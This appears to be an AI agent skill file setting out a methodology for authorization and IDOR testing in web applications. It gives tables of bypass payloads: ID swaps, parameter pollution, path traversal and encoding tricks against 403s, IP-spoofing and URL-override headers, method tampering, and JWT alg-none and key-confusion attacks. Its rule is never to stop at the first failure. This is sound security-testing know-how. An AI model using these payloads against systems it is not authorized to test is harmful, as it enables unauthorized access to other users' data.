---
name: auth-matrix-testing
description: Systematic authentication, authorization, privilege escalation, and IDOR testing methodology. Enforces multi-attempt escalation with bypass techniques at every access control boundary. Use when testing auth/authz, role matrices, IDOR, horizontal/vertical privilege escalation, or business logic access controls.
---

# Auth Matrix Testing

Systematic methodology for testing every access control boundary. Two phases: accuracy-first ledger building, then escalation with advanced bypasses.

## Usage

```
/auth-matrix-testing <target>
```

## Phase 1: Map and Test (Accuracy)

### 1.1 Build the endpoint inventory

Scour all available sources to build a complete endpoint map:

- Proxy history and sitemap (filter by domain, status codes, content types)
- JavaScript source (route definitions, API client configs, permission checks)
- Static analysis matches (API routes, fetch calls, GraphQL operations)
- OpenAPI/Swagger specs if available
- robots.txt, sitemap.xml
- HTML source for hidden forms, AJAX endpoints, admin links

For each endpoint, document:

```
METHOD /path — description — auth required? — roles allowed — params — notes
```

### 1.2 Map the permission matrix

Identify all roles/permission levels available. For each endpoint test with:

| Context | What to send |
|---------|-------------|
| **Unauthenticated** | No session/token |
| **Low-privilege user** | Account A session |
| **Same-privilege peer** | Account B session (horizontal) |
| **Higher-privilege role** | Admin/manager session if available |
| **Expired/invalid session** | Old token, malformed JWT, empty bearer |

Record every response: status code, body length, error messages, headers. Differences are signal.

### 1.3 Test each boundary

For every endpoint where access control exists, test in this order:

**A. Direct access control bypass**
1. Remove auth header/cookie entirely
2. Send empty auth value (`Authorization: Bearer `, `Cookie: session=`)
3. Swap session between users (horizontal IDOR)
4. Swap session between roles (vertical escalation)
5. Use expired/revoked token

**B. Identifier manipulation (IDOR)**

Do NOT stop at simple ID swaps. Test systematically:

| Technique | Example |
|-----------|---------|
| Direct ID swap | `user_id=VICTIM_ID` |
| ID in URL path | `/api/users/VICTIM_ID/orders` |
| ID in query param | `?id=VICTIM_ID` |
| ID in request body | `{"userId": "VICTIM_ID"}` |
| ID in JSON nested object | `{"user": {"id": "VICTIM_ID"}}` |
| ID in custom header | `X-User-ID: VICTIM_ID` |
| Array of IDs | `{"ids": ["ATTACKER_ID", "VICTIM_ID"]}` |
| Wildcard/glob | `user_id=*` or `user_id=..` |
| Numeric overflow | `user_id=0`, `user_id=-1`, `user_id=999999999` |
| Type confusion | `user_id=null`, `user_id=true`, `user_id=[]` |
| UUID manipulation | Swap UUID, sequential UUID guess, nil UUID `00000000-0000-0000-0000-000000000000` |
| Hash/encoded ID | Base64-encoded victim ID, hex-encoded |
| GraphQL variable swap | Change `$userId` variable while keeping query identical |
| Parameter pollution | `?user_id=ATTACKER&user_id=VICTIM` (first/last wins) |
| HPP in body | `user_id=ATTACKER&user_id=VICTIM` in POST body |
| JSON duplicate key | `{"user_id": "ATTACKER", "user_id": "VICTIM"}` |
| Case variation | `User_Id`, `USER_ID`, `userId`, `UserId` |
| Dot notation | `user.id=VICTIM_ID` |
| Bracket notation | `user[id]=VICTIM_ID` |

For **GraphQL**, test mutations AND queries:
- Swap variables in otherwise-identical operations
- Test with `null` variables, missing variables
- Nest victim IDs in input objects
- Test batch queries mixing attacker/victim IDs

**C. Business logic bypass**
1. Skip steps in multi-step workflows (go to step 3 directly)
2. Replay requests out of sequence
3. Race conditions on state changes (single-packet technique)
4. Negative values, zero values, overflow in quantity/amount fields
5. Modify state parameters: `status=approved`, `role=admin`, `verified=true`
6. Parameter mass assignment: add fields not in the form (`is_admin`, `role`, `permissions`)

## Phase 2: Escalation (Advanced Bypasses)

After Phase 1 identifies access-controlled endpoints, systematically apply these bypass categories to every 401/403 response.

### 2.1 Path manipulation

| Technique | Payload |
|-----------|---------|
| Trailing slash | `/admin/` vs `/admin` |
| Double slash | `//admin` |
| Path traversal | `/allowed/../admin` |
| Encoded traversal | `/%2e%2e/admin` |
| Double-encoded traversal | `/%252e%252e/admin` |
| Semicolon injection | `/admin;` , `/admin;foo=bar` |
| Null byte | `/admin%00` |
| Dot suffix | `/admin/.` , `/admin/..` |
| Dot-semicolon | `/admin/..;/` |
| Fragment | `/admin#` , `/admin?` |
| Path param traversal | `/x/..;/admin` |
| Backslash | `/admin\` |
| Extension append | `/admin.json` , `/admin.css` , `/admin.html` |
| Extension via semicolon | `/admin;.css` , `/admin;.json` |
| URL-as-path | `GET https://target.com/admin HTTP/1.1` (absolute URL in request line) |
| Wildcard | `/admin/*` , `/admin/*/anything` |

Apply at **every path segment boundary**, not just the end.

### 2.2 Header-based bypasses

**IP spoofing headers** (test with `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `localhost`):

```
X-Forwarded-For, X-Real-IP, X-Original-URL, X-Rewrite-URL,
X-Custom-IP-Authorization, X-Originating-IP, True-Client-IP,
Client-IP, CF-Connecting-IP, Fastly-Client-IP, X-Client-IP,
X-Cluster-Client-IP, X-Azure-ClientIP, X-ProxyUser-IP
```

**Path/URL override headers** (set to the restricted path):

```
X-Original-URL, X-Rewrite-URL, X-Override-URL, X-Forwarded-Path,
X-Envoy-Original-Path, X-HTTP-Path-Override, X-Accel-Redirect,
X-Original-Path, X-Forwarded-URI, Referer
```

**Method override headers** (when GET works but POST is blocked, or vice versa):

```
X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method,
X-Method, _method (query param)
```

**Host header manipulation:**

```
Host: localhost
Host: 127.0.0.1
X-Forwarded-Host: allowed-host.com
X-Host: internal-host
```

### 2.3 HTTP method tampering

Test every restricted endpoint with all methods:

```
GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, TRACE,
CONNECT, PROPFIND, MOVE, COPY, LOCK, UNLOCK, MKCOL
```

Some ACLs only restrict specific methods — `PATCH` often bypasses `PUT`-only rules.

### 2.4 Content-Type manipulation

```
application/json → application/x-www-form-urlencoded
application/json → multipart/form-data
application/xml → application/json
text/plain (CORS simple request bypass)
```

### 2.5 Encoding and transformation chains

Apply to parameter values, path segments, and header values:

| Encoding | Example |
|----------|---------|
| URL encode | `%61%64%6d%69%6e` |
| Double URL encode | `%2561%2564%256d%2569%256e` |
| Triple URL encode | `%25252561` |
| Unicode | `%ef%bc%8f` (fullwidth solidus), `%c0%af` (overlong /) |
| Mixed case | `aDmIn`, `ADMIN` |
| Null byte injection | `admin%00.json` |
| Overlong UTF-8 | `%c0%ae` for `.`, `%c0%af` for `/` |
| HTML entity | `&#x2F;` for `/` |

### 2.6 Protocol-level tricks

- HTTP/1.0 vs HTTP/1.1 vs HTTP/2 (version downgrade)
- `Connection: close` vs `keep-alive`
- Chunked transfer encoding with trailing headers
- Request line with absolute URL (`GET http://target/admin`)
- Large request body (8KB+) to overflow WAF buffers

### 2.7 Token and session attacks

- JWT `alg: none` / `alg: HS256` with known key / key confusion (RS256→HS256)
- Token field tampering (change `role`, `sub`, `aud`, `scope` claims)
- Cookie attribute manipulation (add `; Path=/admin`, remove `Secure`/`HttpOnly`)
- Session fixation (force victim to use attacker's session)
- Token reuse after password change / logout
- OAuth scope escalation (request wider scopes than granted)

## Documentation: Testing Ledger

For every endpoint tested, record:

```
ENDPOINT: METHOD /path
ROLES_TESTED: [unauth, user_a, user_b, admin]
RESULTS:
  unauth  → 401 (body: "Unauthorized", len: 42)
  user_a  → 200 (body: owns data, len: 1842)
  user_b  → 200 (body: user_a's data exposed!) ← FINDING
  admin   → 200 (body: all data, len: 5210)
BYPASS_ATTEMPTS:
  path /admin;.json → 403 (no change)
  X-Original-URL: /admin → 200 ← FINDING
  method PATCH → 405
IDOR_ATTEMPTS:
  id in path → blocked
  id in body → user_b sees user_a data ← FINDING
  id in header → ignored
STATUS: [finding | exhausted | needs-auth | blocked-by-waf]
```

## Decision Tree

```
Endpoint returns 200 with own data?
├── Yes → IDOR testing (Phase 1B, all techniques)
│   ├── Any ID swap returns other user's data? → FINDING (horizontal IDOR)
│   └── ID swap returns higher-priv data? → FINDING (vertical IDOR)
│
Endpoint returns 401/403?
├── Phase 2 bypass attempts (ALL categories)
│   ├── Any bypass returns 200? → FINDING (access control bypass)
│   ├── Any bypass returns different error? → Lead (test deeper)
│   └── All return same 401/403? → Mark exhausted
│
Endpoint has multi-step flow?
├── Skip steps, replay out of order, race condition
│   └── State change without proper validation? → FINDING (business logic)
```

## Related Skills

- **403-bypass** — Deep technique library for proxy/WAF-layer 403 bypasses with triage guidance on where the block originates.
- **race-condition-single-packet** — For business logic race conditions via HTTP/2 synchronization.
- **oauth-flow-hijack** — When OAuth flows are part of the auth surface.
- **parser-differential-bypass** — When frontend/backend parse the same request differently.
- **report-preflight** — Run before reporting any auth finding.

## Rules

- **Never stop at first failure.** Every 401/403 gets the full bypass matrix.
- **Test combinations.** Path manipulation + header override + method tamper simultaneously.
- **Document everything.** Even "exhausted" endpoints — prevents retesting.
- **Diff responses carefully.** A 403 with different body length is a lead.
- **Run /report-preflight before reporting.** Especially for borderline auth findings.
